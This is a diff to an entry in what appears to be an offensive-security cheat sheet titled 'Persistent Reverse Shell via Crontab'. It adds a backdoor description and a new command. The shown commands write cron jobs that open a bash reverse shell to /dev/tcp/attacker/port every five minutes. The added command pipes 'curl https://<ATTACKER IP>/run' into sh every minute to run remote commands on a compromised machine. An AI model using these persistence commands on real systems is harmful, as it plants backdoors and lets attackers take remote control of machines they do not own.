@@ -1,5 +1,5 @@
 title = "Persistent Reverse Shell via Crontab"
-description = ""
+description = "Backdoor a system and get a reverse shell every couple minutes with cron jobs"
 tags = ["linux", "bash", "backdoor"]
 source = ["https://gist.github.com/hoefler02/2ca8166c167f147c8fb076b48eb7cb47"]
 
@@ -17,3 +17,8 @@ command = """(crontab -l > .tab ; echo "* * * * * <reverse-shell-of-choice>" >> 
 description = "Example sending bash reverse shell every 5 min:"
 language = "bash"
 command = """(touch .tab ; echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/attacker/port 0>&1'" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1"""
+
+[[data]]
+description = "Running arbitrary commands every minute with cron via http. Set up a webserver and create a file named 'run'. Put on it the commands you want to run on the compromised machine."
+language = "bash"
+command = """(crontab -l > .tab ; echo "* * * * * 'curl https://<ATTACKER IP>/run | sh'" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1"""
